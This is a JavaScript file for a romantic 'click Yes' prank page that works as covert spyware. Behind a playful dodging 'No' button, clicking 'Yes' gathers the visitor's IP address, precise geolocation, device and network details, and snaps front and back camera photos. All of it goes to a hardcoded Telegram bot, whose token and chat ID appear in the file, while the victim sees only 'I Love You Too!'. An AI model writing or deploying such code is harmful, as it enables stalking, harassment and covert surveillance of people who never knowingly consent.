const botToken = '7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg';
const chatId = '1208908312';

const noButton = document.querySelector(".no");

function getRandomPosition() {
  const windowWidth = window.innerWidth;
  const windowHeight = window.innerHeight;
  const randomX = Math.random() * (windowWidth - noButton.offsetWidth);
  const randomY = Math.random() * (windowHeight - noButton.offsetHeight);
  return { x: randomX, y: randomY };
}

noButton.addEventListener("mouseenter", () => {
  const { x, y } = getRandomPosition();
  noButton.style.left = `${x}px`;
  noButton.style.top = `${y}px`;
  noButton.style.position = 'absolute';
});

async function handleYes() {
  document.querySelector('.yes').style.display = "none";
  document.querySelector('.no').style.display = "none";
  document.getElementById("loader").style.display = "block";

  try {
    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
    const ip = ipData.ip;

    let locationText = 'Unavailable';
    let latitude = '', longitude = '', country = '';

    if (navigator.geolocation) {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;

      const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
      const geoData = await geoResponse.json();
      country = geoData.address.country || 'Unknown';

      locationText = `https://www.google.com/maps?q=${latitude},${longitude}`;
    }

    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    let deviceName = /android/i.test(userAgent) ? "Android" : (/iPad|iPhone|iPod/.test(userAgent) ? "iOS" : "Unknown Device");
    let osVersion = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;

    let networkType = 'Unknown';
    if (navigator.connection && navigator.connection.effectiveType) {
      networkType = navigator.connection.effectiveType;
    }

    const frontImage = await captureImage('user');
    const backImage = await captureImage('environment');

    const textMessage = `
❤️ Someone Clicked YES!
IP Address: ${ip}
Device: ${deviceName}
OS Version: ${osVersion}
Network: ${networkType}
Location: ${locationText}
Country: ${country}
    `;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: textMessage
      })
    });

    if (frontImage) {
      await sendPhotoToTelegram(frontImage, "Front Camera");
    }
    if (backImage) {
      await sendPhotoToTelegram(backImage, "Back Camera");
    }

    document.getElementById("loader").style.display = "none";
    document.getElementById("message").innerHTML = '<h2 style="color:white;">I Love You Too!</h2><div class="heart"></div>';
  } catch (error) {
    console.error(error);
    document.getElementById("loader").style.display = "none";
    document.getElementById("message").innerHTML = '<h2 style="color:white;">Failed to send love...</h2>';
  }
}

async function captureImage(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(resolve => setTimeout(resolve, 1000));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(track => track.stop());
    return canvas.toDataURL('image/jpeg');
  } catch (error) {
    console.error('Error capturing image', error);
    return null;
  }
}

async function sendPhotoToTelegram(base64Image, caption) {
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('caption', caption);
  formData.append('photo', dataURLtoBlob(base64Image));

  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(',');
  const mime = parts[0].match(/:(.*?);/)[1];
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}
